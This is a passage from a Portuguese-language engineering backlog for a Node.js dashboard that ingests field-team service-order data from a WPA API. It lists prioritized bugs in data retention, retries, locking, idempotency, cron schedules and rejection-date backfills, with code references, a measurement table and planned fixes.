  `carteiraInicialDe` e a aba de detalhe do modal, não.
- **Causa raiz:** o WPA acumula em `notasExecutadas` toda nota que a equipe
  abriu no dispositivo — inclusive as já concluídas na mesma sessão. Uma
  nota em transição (executando → concluída) aparecia em 2 buckets, violando
  a invariante "cada UUID em exatamente 1 estado".
- **Impacto:** card por equipe e carteira inicial daquela equipe inflados;
  gerava desconfiança na acertividade. **NÃO afetava produtividade reportada
  à EDP** (essa conta só `notasConcluidas` via `_aggregateTeamDailyTotals`).
- **Ação (feita):**
  1. Helper `_notasEmAndamento(t)` como fonte única: `notasExecutadas`
     menos ids já em concluídas/rejeitadas (estados terminais).
  2. `_andamentoReal(t,de,ate)` aplica o range por cima. Usado no card por
     equipe e em `carteiraInicialDe` (que somava andamento inflado).
  3. Card agregado passou a excluir também rejeitadas (antes só concluídas).
  4. Aba "Em Andamento" do modal + `renderNotas('executada')` usam a lista
     deduplicada — número da aba bate com o card.
  5. Tooltip no card explicando o significado de "Andamento".
- **Aceite:** ✅ card do EPICO30 mostra andamento=2 (as 2 realmente
  iniciadas); ✅ suíte 196/196; ✅ equipe com N notas legítimas em curso
  segue mostrando N (não mascara número real).
- **Rollback:** `git revert fc2170d`.
- **Nota de princípio:** não é manipulação de número — remove dupla
  contagem de um estado terminal. Alinhado à regra 7 do CLAUDE.md
  (aritmética fecha por construção; corrigir a origem, não a exibição).

---

## P2-18 — `note_details` tem TTL de 90 dias e é a ÚNICA fonte de checkpoints (quebra a promessa de reconstrução retroativa)

- **Categoria:** Dados / Retenção
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/dataWriter.js:948-965` (`cleanOldNoteDetails`, cutoff
  `dateBRTMinusDays(90)`), agendado em `services/cronService.js:978`.
  `db/deslocamentosQueries.js:5` declara que a análise vem
  **exclusivamente** de `note_details.payload.checkpoints[]`. O snapshot não
  guarda checkpoint nenhum: `dataWriter.js:42-55` grava contagens + `data: t`, e
  `t` vem de `wpaService.js:1383-1428`, sem checkpoints.
- **Impacto:** a decisão de 07/07/2026 promete que **qualquer métrica nova pode
  ser reconstruída pro passado**. Para deslocamento/rota, essa promessa é falsa
  além de 90 dias — e não é backfillável: exigiria 1 request por nota em meses
  passados, na conta que bloqueia após 5 falhas. Os scripts do outro projeto
  guardam `servico_detalhes`/`rota_dia` **permanentemente**.
- **Ação:** ⬜ extrair para tabela estreita `note_checkpoints(note_id, seq, event,
  try, ts, lat, lng)` antes do TTL (~5 linhas/nota, barato), ou tornar a
  retenção configurável como a de snapshots.
- **Esforço:** 4h + backfill dos 90 dias ainda vivos.
- **Relacionado:** P2-15, P3-6, P1-28.

---

## P2-19 — Equipe fora da whitelist é descartada ANTES do snapshot, sem log: histórico não-backfillável

- **Categoria:** Dados / Retenção
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/dataService.js:17-20` — `_filterOficiais` filtra por
  `isOficial()` **sem log algum**; aplicado em `getTeams` (`:587`) → `cronService.js:133`
  → `saveSnapshot` (`:163`). Em contraste, `services/notasMonitor.js:47-55` faz o
  mesmo filtro **com** `log.warn('equipes_candidatas_cadastro')`.
- **Impacto:** cadastrar uma equipe nova em `equipes_oficiais` hoje **não traz o
  histórico dela** — é a única classe de dado que não é backfillável. E a coluna
  `notas_snapshots.equipe_oficial` (`db/schema-atual.sql:162`) mais o índice
  `idx_notas_snapshots_oficial` existem exatamente para marcar isso, mas **nunca
  recebem `false`**: o código descarta em vez de marcar. Índice morto.
- **Ação:** ⬜ gravar snapshot bruto de TODA equipe Engelmig (filtrando por
  `CompanyId`) e aplicar a whitelist na **leitura** — que é o que
  `db/queries.js:51-54` (`_onlyOficiais`) já faz; ⬜ coluna `equipe_oficial` em
  `snapshots` para não mexer em nenhum número atual; ⬜ no mínimo, um `log.warn`
  com as siglas descartadas.
- **Esforço:** log 15min · snapshot bruto 4h (avaliar impacto no tamanho).
- **Relacionado:** whitelist `equipes_oficiais` (decisão de negócio), P2-20.

---

## P2-20 — Ler o histórico depende da whitelist de HOJE: desativar uma equipe apaga produção já reportada

- **Categoria:** Dados / Governança
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `db/queries.js:51-54` chama `isOficial()`, que lê o cache vivo
  de `equipes_oficiais` (`services/equipesOficiais.js:265-273`).
  `team_daily_totals` (`db/schema-atual.sql:342-350`) não tem `equipe_oficial`
  nem o `tipo` da equipe — `tipo` vem de `getMeta()` em runtime
  (`db/queries.js:1324`, `wpaService.js:1391`). `equipes_oficiais` é UPDATE
  in-place, só `updated_at`, sem histórico.
- **Impacto:** `UPDATE equipes_oficiais SET ativo=false` no fim do contrato de
  uma equipe **apaga do painel a produção de julho já reportada à EDP**. Trocar o
  `tipo` de uma equipe reescreve retroativamente todo relatório por tipo. Sem log,
  sem versão.
- **Ação:** ⬜ versionar a whitelist (`vigente_de`/`vigente_ate`); ⬜ congelar o
  `tipo` na linha de `team_daily_totals` no momento da escrita.
- **Esforço:** 6h (migração + ajuste nas leituras).
- **Relacionado:** P2-19.

---

## P2-21 — `ConclusionStatus` e `DesiredConclusionDate` são descartados no `normalizarNotaV2`: KPI de SLA a custo zero de rede

- **Categoria:** Dados / Produto
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/wpaService.js:1132-1139` (`normalizarNotaV2`) devolve
  só `{id, codigo, tipoCode, tipoNome, status, conclusionDate}`; idem
  `normalizarNotaHist` (`:804-813`). Os dois campos **chegam no mesmo payload**
  que já baixamos ~86×/snapshot. Nós mesmos decodificamos a semântica em
  22/07/2026: `scripts/audit-indicadores.js:357-358` registra
  **`ConclusionStatus` = PONTUALIDADE** (`ok` = no prazo, `late` = fora da
  Conclusão Desejada), e `:30` afirma explicitamente que
  *"normalizarNotaV2 descarta ConclusionStatus"*. Capturamos em **um** lugar só:
  `services/notasMonitor.js:105` (fluxo de notas devolvidas), não no pipeline de
  produção. `DesiredConclusionDate` só aparece em `notaProcessor.js:124`, isto é,
  a partir do fetch caro por nota.
- **Impacto:** "nota atendida dentro do prazo" é o indicador mais provável de a
  EDP cobrar num contrato de 60 meses, e hoje **não é reconstruível além de 90
  dias** (o detalhe morre no TTL do P2-18). Dois campos a mais no
  normalizador e passa a valer para todo snapshot novo, sem um único request extra.
- **Ação:** ⬜ acrescentar `conclusionStatus`, `desiredConclusionDate` (e `city`)
  em `normalizarNotaV2`/`normalizarNotaHist`; ⬜ depois, KPI de pontualidade por
  equipe/regional.
- **Esforço:** 1h para capturar · KPI depois.
- **Relacionado:** P2-18, P2-31.

---

## P2-22 — 429 / 503 não são retentados e viram bucket vazio silencioso

- **Categoria:** Ops / Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/wpaService.js:1310-1325` (`_safeNotes`) —
  `if (!res.ok) { console.warn(...'esvaziando bucket'); return []; }`. O retry do
  `wpaFetch` (`:494-541`) só cobre erro de rede e cold-start detectado por **corpo
  HTML** contendo "Web App - Unavailable" (`_isAzureColdStartResponse`, `:475-482`).
  Grep por `429|Retry-After` em `services/` = nada.
- **Impacto:** sob throttle (a API é Azure App Service, e o pipeline Python do
  outro projeto martela a mesma conta), `notes/rejected` e `notes/executed`
  voltam 429 → `rejeitadas=[]` e `executadas=[]`. O `_accApply`
  (`wpaService.js:1041-1047`) considera o payload íntegro porque `baixadas` (do
  V2) passou → não re-injeta andamento. O snapshot grava zeros e **nada, em log ou
  banco, diz que foi throttle e não realidade**. Em processo recém-reiniciado o
  `_acc` está vazio e as rejeitadas também se perdem.
- **Ação:** ⬜ tratar 429/503 como transientes no `wpaFetch`, respeitando
  `Retry-After`; ⬜ `_safeNotes` devolver `{notes, failed:true}` e propagar a flag
  até o report, para bucket-vazio-por-falha nunca virar bucket-vazio-real.
- **Esforço:** 3h + testes.
- **Relacionado:** P1-31, P1-13, P2-30.

---

## P2-23 — Lock do snapshot destrava em 5 min mas a execução continua: o `finally` da antiga libera a nova

- **Categoria:** Ops / Backend
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/cronService.js:27` (`MAX_RUN_MS = 5*60_000`),
  `:122-129` (se `elapsed >= MAX_RUN_MS`, loga `snapshot_unstuck` e **segue**),
  `:130-131` (sobrescreve `isRunning`), `:241-243` (`finally { isRunning = false }`).
- **Impacto:** não há cancelamento — a execução "travada" segue viva (e sem
  timeout, P1-31, pode nunca morrer). Quando ela termina, o `finally` dela zera o
  flag **da execução nova**, liberando o lock para uma terceira. O lock se
  corrompe em vez de degradar. Cada execução são ~270 fetches na conta
  compartilhada, e `saveSnapshot` usa `insert` puro (`dataWriter.js:57`), então
  execuções sobrepostas **duplicam linhas** em `snapshots`.
- **Ação:** ⬜ trocar o booleano por token de execução (`currentRun = {id}`); o
  `finally` só limpa se o id for o dele. Com o P1-31 no ar, o `MAX_RUN_MS` deixa
  de ser necessário como escape.
- **Esforço:** 2h.
- **Relacionado:** P1-31, P2-26, P3-4.

---

## P2-24 — Não existe cadastro de escala por dia: o P1-26 não tem onde guardar o dado

- **Categoria:** Dados / Schema
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido: `grep -rn "collaboratorshifts|ScaleCategory"`
  em `services/ db/ routes/ scripts/` = **0 ocorrências**.
- **Evidência:** o que existe é um turno **estático** por equipe:
  `equipes_oficiais.escala_inicio/escala_fim time without time zone`
  (`db/schema-atual.sql:116-117`), lido em `services/equipesOficiais.js:180-183`.
  Nada equivalente à tabela `escalas` deles (horário por código de escala) nem ao
  `ESCALA_EXCLUIR`.
- **Impacto:** (a) impossível distinguir folga de falta — é a **raiz do P1-26**,
  agora com o diagnóstico: não há onde guardar; (b) equipe em 12x36 ou turno
  rotativo é modelada por um único par de horários, silenciosamente errado;
  (c) `escala_inicio/fim` é UPDATE in-place — mudar o turno hoje reescreve o
  "atrasou para logar" de todos os dias passados.
- **Parcialmente coberto:** o `shiftType` da WPA (`"T07 07:00"`) **é** capturado
  por snapshot (`wpaService.js:1412-1415`), então a escala de quem **logou** é
  reconstruível. Falta exatamente quem não logou.
- **Ação:** ⬜ tabela `escala_dia(setor, equipe, data, codigo_escala, inicio, fim)`
  alimentada por `/collaboratorshifts/{setor}/{mes}/{ano}` — 1 request por
  setor/mês, custo irrelevante; ⬜ tabela de referência dos códigos com os
  excluídos (`FOL, DR, DES, FER, DIS, AFO, NA, SAV, SIN, TRE`). **Não confirmado:**
  se o endpoint devolve meses passados (aceita mês/ano como parâmetro, mas testar
  custa login na conta escassa).
- **Esforço:** 6h.
- **Relacionado:** P1-26, P1-1, P2-15.

---

## P2-25 — pgShim não registra NENHUM type parser: `numeric` volta string, e `quantidadeExec` tem dois tipos no mesmo jsonb

- **Categoria:** Dados / Backend
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido: `grep -rn setTypeParser` = 0.
- **Evidência:** `services/pgShim.js:32` importa só `Pool`. Logo: DATE (1082) →
  `Date` (é o P2-17), TIMESTAMPTZ (1184) → `Date` (ok), **NUMERIC (1700) →
  string**, **BIGINT (20) → string**.
- **Onde já morde:** `note_subcategorias.quantidade` é numeric →
  `db/subcategoriasQueries.js:70` devolve string → `cronService.js:366` repassa →
  `services/notaProcessor.js:93` grava `quantidadeExec` como **string** no
  `note_details.payload`, enquanto o branch de fallback
  (`services/classifierService.js:223`, `ativC93.Amount`) grava **número**. O
  mesmo campo do mesmo jsonb tem dois tipos conforme o caminho.
- **Onde NÃO morde (verificado):** todas as agregações envolvem em `Number()`
  (`db/queries.js:496,533,569,838,983,1116`; `dataWriter.js:528`;
  `cronService.js:864`); `count` é integer; `osrm_cache` é integer.
- **Ação:** ⬜ registrar os parsers uma vez no pgShim (`1700 → parseFloat`,
  `1082 → 'YYYY-MM-DD'`). O de DATE elimina de uma vez a família de bugs
  Date×string do P1-15/P2-12 e ~10 `_ymdDate()`/`Number()` defensivos.
  **Rodar `node --test` antes** — há testes que assumem o `Date` atual.
- **Esforço:** 2h + revisão da suíte.
- **Relacionado:** P2-17, P1-15, P2-12.

---

## P2-26 — `snapshots` é a única tabela sem chave de idempotência (INSERT puro)

- **Categoria:** Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `db/schema-atual.sql:541-542` — PK é a sequência;
  `services/dataWriter.js:57` usa `.insert(rows)`, não upsert. Nenhum UNIQUE em
  `(date, team_name, captured_at)`.
- **Impacto:** contraria o "Idempotência sempre" do CLAUDE.md. Duas execuções no
  mesmo ciclo (restart do PM2 + snapshot de boot, backfill manual, ou o P2-23)
  duplicam linhas numa tabela **retida para sempre**. Não infla totais (tudo
  dedupa por UUID), mas pode inverter o "primeiro/último snapshot" de
  `team_daily_carteira` (`dataWriter.js:989-1004`) quando dois compartilham
  `captured_at`.
- **Ação:** ⬜ `UNIQUE (date, team_name, captured_at)` + `.upsert()`.
- **Esforço:** 2h (checar duplicatas existentes antes de criar o UNIQUE).
- **Relacionado:** P2-23, P3-14.

---

## P2-27 — Nota sem `id` tem três comportamentos incompatíveis no mesmo pipeline

- **Categoria:** Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:**
  | caminho | linha | comportamento |
  |---|---|---|
  | intraday | `services/dataWriter.js:415` | `` `sem-id:${…}:${Math.random()}` `` → **conta** |
  | consolidação | `services/dataWriter.js:612-613` | `if (id && !e._conc.has(id))` → **descarta** |
  | subcategorias | `services/dataWriter.js:476` | `if (!n.id) return;` → **descarta** |

  E `normalizarNotaV2` (`wpaService.js:1133`) / `normalizarNotaHist` (`:806`)
  fazem `id: n.Id || null`, então o caso-limite existe por construção.
- **Impacto:** a mesma nota aparece no painel ao vivo, desaparece na consolidação
  e nunca entra na aba de subcategorias — três números. Além disso o
  `Math.random()` está dentro de função rotulada `FUNÇÃO PURA (testável)`
  (`dataWriter.js:368`), o que a torna não-determinística.
- **Ação:** ⬜ um comportamento único (descartar + `log.warn` com contador é o
  mais defensável) travado em teste.
- **Esforço:** 2h.
- **Relacionado:** P0-3, P2-2.

---

## P2-28 — `collaborators` vem sempre vazio ao vivo: o ranking de rejeições por colaborador não tem linhas

- **Categoria:** Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Aprofundamento do P2-14, com impacto
  concreto identificado.
- **Evidência:** `services/wpaService.js:1398` monta
  `collaborators: (s.Collaborators || []).map(normalizarColaborador)` a partir de
  **`Sessions/all/date`**, que o nosso próprio código (`wpaService.js:778-779`) e
  o cookbook documentam como devolvendo `Collaborators` **vazio**. O backfill
  histórico faz certo: `getTeamsByDate` chama `getSessionDetail(sid)` por sessão
  (`wpaService.js:828, 837`) — o caminho ao vivo não faz.
- **Impacto verificado no código:** `services/cronService.js:477-482` deriva
  `collaborator_codes/collaborator_names` de `t.collaborators` para gravar em
  `note_rejections`; `db/rejectionsQueries.js:167-168` faz `unnest` desses arrays
  para o ranking de rejeições por colaborador. Com o array vazio, **essa consulta
  não tem linhas**. O `scripts/backfill-rejections.js:92-98` lê dos snapshots, que
  vêm do mesmo caminho vazio, então o backfill não corrige.
  **Não confirmado:** o estado real da tabela em produção (sem acesso ao banco).
- **Ação:** ⬜ conferir a tabela em produção; ⬜ chamar `getSessionDetail` ao vivo
  como o backfill já faz (talvez sem precisar do endpoint novo do P2-14);
  ⬜ se implementar o P2-14, copiar o normalizador dict×lista deles
  (`_nomes_colaboradores`) — o `teamsstatus/V2` devolve ora dict, ora lista.
- **Esforço:** diagnóstico 30min · correção 3h.
- **Relacionado:** P2-14.

---

## P2-29 — Cron `*/45` não é "a cada 45 min", e RUNBOOK + log de boot divergem do cron real

- **Categoria:** Ops / Documentação
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:**
  - `services/cronService.js:1116` — `cron.schedule('*/45 * * * *', runTokenRefresh)`.
    No campo de minutos, `*/45` = minutos **0 e 45**: os intervalos reais são
    45 min e 15 min, alternando. São **48 `/signin` forçados por dia** (cada um
    ignora token válido — ver P1-29) em vez dos ~32 pretendidos, na conta
    compartilhada.
  - `services/cronService.js:1149` — consolidação em `'50 23 * * *'`, mas o log de
    boot (`:1176`) diz "consolidação 20:30", o cabeçalho do arquivo (`:8`) diz
    "20:30 BRT" e o `docs/handoff/RUNBOOK.md` repete em **três** lugares
    (`:227`, `:510`, `:539`).
  - O mesmo log diz "snapshot 15 min (06–20h)" enquanto o cron é `*/15 5-23`
    (`:1126`) + madrugada `30 0,2,4` (`:1133`).
- **Impacto:** incidente às 22h — quem opera pelo RUNBOOK conclui que a
  consolidação já rodou e investiga o agregado; na verdade ela roda às 23:50,
  5 min depois do último snapshot das 23:45, e sem lock entre `runConsolidate` e
  `runSnapshot`.
- **Ação:** ⬜ definir a intenção do token refresh e escrever o cron explícito;
  ⬜ corrigir o log de boot e as 3 ocorrências do RUNBOOK; ⬜ dar margem maior
  entre o último snapshot e a consolidação.
- **Esforço:** 1h.
- **Relacionado:** P1-29, P3-4.

---

## P2-30 — Não existe orçamento global de concorrência contra a WPA: as caudas do snapshot ficam fora do lock

- **Categoria:** Ops
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Conferido.
- **Evidência:** `services/cronService.js:206` (`runClassifyNewNotes`), `:223`
  (`runCacheNotaDetails`), `:229` (`runClassifyRejections`), `:235`
  (`runSyncEscalas`) — todos disparados **sem `await`**, e o `isRunning` é
  liberado em `:241-243`. Custo dessas caudas: até 30 × `/details/optimized`
  (50-150 KB cada) em concorrência 4 (`:309`, `:354`); `classificarBatch` em
  concorrência 10 (`:440`); `runClassifyRejections` em concorrência 4 onde **cada
  nota custa até 9 requests** (`rejectionService.js:80-92`).
- **Impacto:** num dia com muitas rejeições DL/LE/RL, a cauda das 07:00 ainda
  está varrendo 9 endpoints por nota quando o snapshot das 07:15 abre seus ~270
  fetches e o `runNotasCollect` das 07:05 dispara o `Promise.all` sobre 4 setores.
  Nenhum desses caminhos conhece os outros — e é a mesma conta que o pipeline
  Python do outro projeto está martelando.
- **Ação:** ⬜ semáforo único de saída para a WPA (fila + limite global, ex.: 12
  em voo) atravessado por `wpaFetch` — é o único ponto por onde tudo passa
  (`wpaService.js:493`), então é mudança localizada e testável sem staging.
- **Esforço:** 4h + testes.
- **Relacionado:** P1-25, P1-31, P2-22, P3-4.

---

## P2-31 — Campos e buckets que existem e não aproveitamos (varredura completa)

- **Categoria:** Dados
- **Status:** pending
- **Origem:** revisão paralela 20/08/2026. Cada item foi conferido por grep no
  repo (0 ocorrências, salvo onde indicado).
- **Lista:**
  1. **`Checkpoints[].Try`** — `notaProcessor.js:39-56` mapeia 10 campos do
     checkpoint e **não** o `Try`; lemos só o `Try` de nível de nota (`:134`).
     Separa 1ª visita de re-visita na trilha GPS → retrabalho e deslocamento
     improdutivo por nota. É o que torna a "rota do dia" deles interpretável.
  2. **`SessionBreakReason.Responsible`** (+ `.Text`) — quem autorizou a parada
     (EDP × equipe). Sem esse campo, "parada longa" é ruído; com ele, dá para
     excluir a parada determinada pela distribuidora do indicador de
     improdutividade. Mesmo princípio do P1-26.
  3. **`LastLocationComunication`** (V2, nível do item) — separa "app comunicou"
     de "**GPS** comunicou": app travado × equipe sem sinal. Distinto do
     `LastStatusUpdateWithoutSignal` do P2-17.
  4. **`Team.LastUpdateWallet`** (em `Sessions/all/date`) — há quanto tempo a
     carteira da equipe não sincroniza, sem depender de `IsOnline`.
  5. **`Address`/`Neighborhood`/`City` na lista de notas da sessão** — hoje só
     lemos do `details/optimized` (fetch caro): `classifierService.js:205`,
     `notaProcessor.js:105-107`. A regra **RAMAL BT** do indicador C93 (auditado
     pela EDP) depende de `Address` (`classifierService.js:201-206`,
     `notaProcessor.js:199-201`); o campo já chega de graça na lista, servindo de
     **cross-check independente** do C93 e de pré-filtro.
  6. **`Team.Description`** — descrição legível da equipe; pista de `tipo` quando
     aparece equipe fora da whitelist.
  7. **`Assigned[]` do V2** — `wpaService.js:619` documenta o bucket ("notas
     atribuídas ainda não baixadas") e o único lugar que o toca é uma rota de
     debug (`routes/index.js:1395`). A coleta real usa só `Concluded[]` +
     `Downloaded[]` (`:1286-1291`) e ele fica fora do `carteiraInicialCount`
     (`:983-993`). Bucket existente e não usado — decidir se entra.
  8. **`Team.SectorId` aninhado — PROBE, possível bug de regional.**
     `import_wpa_es.py` lê `team.get("SectorId")` em `Sessions/all/date`; nós
     fazemos `s.SectorId || s.Sector?.Code || sectorId` (`wpaService.js:1251` ao
     vivo, `:840` no backfill) e **nunca** olhamos `s.Team?.SectorId`. Se o setor
     vier só dentro de `Team`, nosso valor cai sempre no `|| sectorId` do
     parâmetro e a **regional de equipe visitante fica errada** — número que vai
     para a EDP. 1 probe resolve.
  9. **KB com afirmação provavelmente falsa:** `docs/WPA-EDP-KNOWLEDGE-BASE.md:3306-3307`
     diz que `Vehicle.Code` vazia em `sessions/all` **"não tem como recuperar"**.
     Eles leem `Vehicle.Label` do mesmo endpoint; nós lemos `Vehicle?.Code`
     (`wpaService.js:1396`, `:861`). Corrigir a KB junto com o P2-17 item 3 —
     senão alguém no futuro confia nela.
- **Ação:** ⬜ probe dos itens 8 e 9 (1 request cada); ⬜ capturar 1-6 nos
  normalizadores; ⬜ decidir o 7.
- **Esforço:** probes 1h · captura 3h · uso no painel depois.
- **Relacionado:** P2-17, P2-21, P2-15, P1-26.

---

## P2-32 — Rejeição sem `RejectedAt` herda o dia do ARRASTO e pode suprimir produção legítima

- **Categoria:** Dados
- **Status:** **código done** (21/08/2026) — VL/SM mapeados, cache negativo, 3 testes. Falta o backfill das 1302 linhas existentes. NÃO dependia do P1-33.
- **Origem:** resíduo do P0-8, isolado pelas duas medições de 21/08/2026. É o
  único risco que sobrou depois de o P0-8 ser fechado como não-problema.
- **Evidência:**
  - `services/dataWriter.js:267` — `_ymdDate(r.rejection_date || r.session_date)`.
    O `rejection_date` é o `RejectedAt` da WPA (`services/rejectionService.js:151`),
    autoritativo. O `session_date` é, nas palavras do próprio comentário
    (`dataWriter.js:256-259`), *"o dia em que o coletor VIU a rejeição, que pode ser
    posterior ao fato"*.
  - A medição mostrou que a mesma rejeição aparece no payload de **dois dias
    consecutivos** (395/395 dos casos). Então, quando o `RejectedAt` falta, o dia
    gravado pode ser o do arrasto — um dia à frente do fato.
- **Impacto:** `_contaComoExecutada` suprime a produção quando algum dia de
  rejeição é `>=` o dia da nota. Rejeição empurrada um dia pra frente passa a
  cobrir a conclusão e **derruba produção que era legítima**. É o INVERSO do que o
  P0-8 supunha, e por isso não aparece como inflação em nenhum relatório: aparece
  como subnotificação, que é o modo de falha mais difícil de perceber.
- **Quem está exposto:** os tipos sem endpoint de rejeição conhecido —
  `services/rejectionService.js:22-24` documenta `DL`, `LE` e `RL` como
  *"endpoint desconhecido"*, gravando `motivo_codes: []`. Se não há formulário de
  rejeição lido, provavelmente não há `RejectedAt` — a mesma lacuna, dois sintomas.
### MEDIÇÃO 21/08/2026 — e a causa não era a que eu previ

Cobertura de `RejectedAt` por tipo (jun–ago/2026):

```
tipo   rejeições   sem RejectedAt
DL         1259           1  (0%)
LE         1140           2  (0%)
RL          564           1  (0%)
SF         7135           3  (0%)
LN         1583           1  (0%)
MD         2423           0  (0%)
VL         1278        1278  (100%)   ← aqui
SM           16          16  (100%)
----
TOTAL     15398        1302  (8%)
das 395 notas de 2 dias, sem RejectedAt: 66
```

**Eu previ DL/LE/RL e errei.** A auto-descoberta por `FALLBACK_PATHS` resolveu
esses três há tempos — o comentário de cabeçalho do `rejectionService.js` que
dizia *"endpoint desconhecido → 404"* estava **desatualizado** e ninguém notou
(corrigido no mesmo commit, com a tabela acima registrada no arquivo).

**A causa real é mais simples e pior:** `VL` e `SM` **não estavam em
`CANDIDATE_PATHS`**. Tipo que não está nem em `KNOWN_PATHS` nem em
`CANDIDATE_PATHS` cai no ramo `uniquePaths.length === 0`
(`services/rejectionService.js`), que devolve `endpoint_missing` **sem fazer uma
única chamada**. Não era "o endpoint não existe": era o tipo nunca ter sido
tentado. 1278 rejeições VL gravadas com `motivo_codes: []` e `rejection_date:
null` por uma entrada faltando numa tabela.

E isso não é cosmético: sem `RejectedAt`, `_rejIndexByNote` cai no
`session_date` — o dia em que o coletor VIU —, que com o arrasto entre snapshots
pode estar 1 dia à frente do fato. Rejeição empurrada pra frente cobre a
conclusão e **suprime produção legítima**. Subnotificação, não inflação: o modo
de falha que não aparece em relatório.

**Ação:**
  1. ✅ medir a exposição — feito 21/08, tabela acima.
  2. ✅ mapear `VL`/`SM` em `CANDIDATE_PATHS` com `FALLBACK_PATHS` (o que fez
     DL/LE/RL funcionarem) — feito 21/08. **Não** precisou do P1-33.
  3. ✅ cache NEGATIVO (`_noPathForTipo`): sem ele, um tipo cujos candidatos todos
     falham paga a lista inteira em CADA nota — 1278 × 8 ≈ 10 mil requests
     inúteis na conta compartilhada (P1-25). Agora é 1 tentativa por processo.
     Só marca em 404 puro; um 500 significa que o endpoint existe.
  4. ✅ teste de guarda-corpo: todo tipo visto em produção tem de ter entrada em
     `KNOWN_PATHS` ou `CANDIDATE_PATHS` — tipo novo sem mapeamento falha a suíte
     em vez de gravar rejeição vazia em silêncio.
  4b. ✅ **`/api/notes/vl` CONFIRMADO** (21/08, backfill `--tipo VL --limite 20`):
     20/20 ganharam `rejection_date` E `motivo_codes`, em ~1s, zero erro.
     Promovido pra `KNOWN_PATHS`. Nuance registrada no arquivo: `vl` é path POR
     TIPO, o que contraria a generalização de 25/05 ("é por formulário, não por
     tipo") — os dois padrões existem e convivem.
  5. ⬜ backfill das 1302 linhas existentes: o retry normal filtra por PRESENÇA na
     tabela (`cronService.js` ~660), então nunca volta nelas.
     `scripts/backfill-rejeicoes-sem-data.js` (novo) faz UPDATE só das que estão
     sem data. Rodar `--dry-run`, depois `--tipo VL --limite 20`, conferir, e só
     então inteiro.
  6. ✅ backfill COMPLETO rodado 21/08: 1266/1282 ganharam `rejection_date` E
     `motivo_codes` em 40s, zero erro. Descobertos no caminho: `RL → /api/notes/sfrl`,
     `LE → /api/notes/lnrl`, `DL → /api/notes/sfdl`. `SM` (16 linhas) esgotou os
     candidatos e entrou no cache negativo — único tipo realmente sem endpoint.
  7. ⚠️ **NÃO APLICAR a re-consolidação ainda.** O dry-run 01/06→20/08 deu TOTAL
     −308, mas com DUAS populações opostas:
       • 01/06→29/07: positivos pequenos (+1 a +26), soma ~+340 — é o efeito
         esperado do backfill (rejeição volta pro dia real, produção retorna);
       • 14/08 e 17→20/08: negativos grandes (−102 a −202), soma ~−645. Os
         "antes" desses dias (1185, 1288) estão acima de toda a série e o "depois"
         (983, 1164) cai pra faixa normal. Não tem a forma do backfill.
     **Erro de método admitido:** o dry-run foi rodado DEPOIS do backfill, sem
     linha de base, então os dois efeitos estão somados e não são atribuíveis.
  8. ⬜ separar os efeitos: `scripts/diag-rejeicoes-data-mudou.js` (novo). O
     backfill gravou `fetched_at = now()`, então as 1266 linhas são
     identificáveis, e o efeito na regra depende SÓ de o dia ter mudado
     (`date(rejection_date)` vs `session_date`). Isso dá o TETO exato do efeito do
     backfill por mês. Se agosto tiver ~0 linhas com dia alterado, os −645 são de
     outra causa — hipótese: P1-15, dias consolidados antes de as rejeições serem
     coletadas (os `injetadas` desses dias são 394/442/319).
  9. ⬜ só depois decidir o que aplicar, e provavelmente em duas janelas separadas
     (jun–jul por um motivo, ago por outro). Lembrar do P0-6: subtrair produção
     em massa já apagou dado legítimo antes — foi por isso que o reparo do drift
     virou monotônico.
- **Critério de aceite:** toda linha de `note_rejections` dos tipos DL/LE/RL tem
  `rejection_date` preenchido, ou existe medição mostrando que a ausência não
  altera nenhum total.
- **Esforço:** medição 15min · correção junto do P1-33.
- **Rollback:** n/a (só passa a gravar um campo que hoje fica nulo).
- **Relacionado:** P0-8 (fechado), P1-16, P1-24, P1-33.

---

# P3 — Baixa prioridade (higiene, faça se sobrar tempo)

## P3-1 — Dividir `routes/index.js` por domínio

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** `routes/index.js` = 2.755 linhas, ~60 rotas, 12 domínios.
- **Impacto:** Manutenibilidade. Não é urgente, mas cada mudança fica mais
  arriscada.
- **Ação:** Extrair um domínio por PR (começar por `debug` + `admin`,
  ~1.200 linhas juntos). Preservar `routes/index.js` como orquestrador
  (mount + middlewares).
- **Aceite:** `routes/index.js` < 500 linhas ao fim.
- **Esforço:** 1-2 semanas incremental.
- **Rollback:** Cada PR é rollback-able.
- **Depende de:** P2-1 (testes de contrato pra garantir zero regressão).

## P3-2 — Split incremental do `index.html`

- **Categoria:** Frontend
- **Status:** pending
- **Fonte:** Auditoria de frontend 2026-07-08
- **Evidência:** 12.832 linhas, 286 funções globais, 56 lets soltos.
- **Impacto:** Manutenibilidade. Onboarding de novo dev demora semanas.
- **Ação:** JS em arquivos ordenados `public/js/00-auth.js`, `01-constants.js`,
  `02-state.js`, `10-multiselect.js`, `20-monitor.js`, ..., `90-boot.js`
  via `<script src>` clássicos. Sem bundler.
- **Aceite:** `index.html` só HTML + `<link>` + `<script>` refs.
- **Esforço:** 3-4 semanas incremental.
- **Rollback:** Cada aba é PR separado, rollback-able.
- **Depende de:** P2-8 (CSS já extraído).

## P3-3 — Error handler central do Express

- **Categoria:** Backend
- **Status:** pending
- **Fonte:** Auditoria de backend 2026-07-08
- **Evidência:** 65 ocorrências de `res.status(500).json({error: err.message})`
  em `routes/index.js`.
- **Ação:** `app.use((err, req, res, next))` em `server.js` com request-id
  + resposta genérica. Helper `asyncHandler(fn)` migrado gradualmente.
- **Aceite:** Nenhum novo handler precisa de try/catch inline.
- **Esforço:** meio dia + migração gradual.
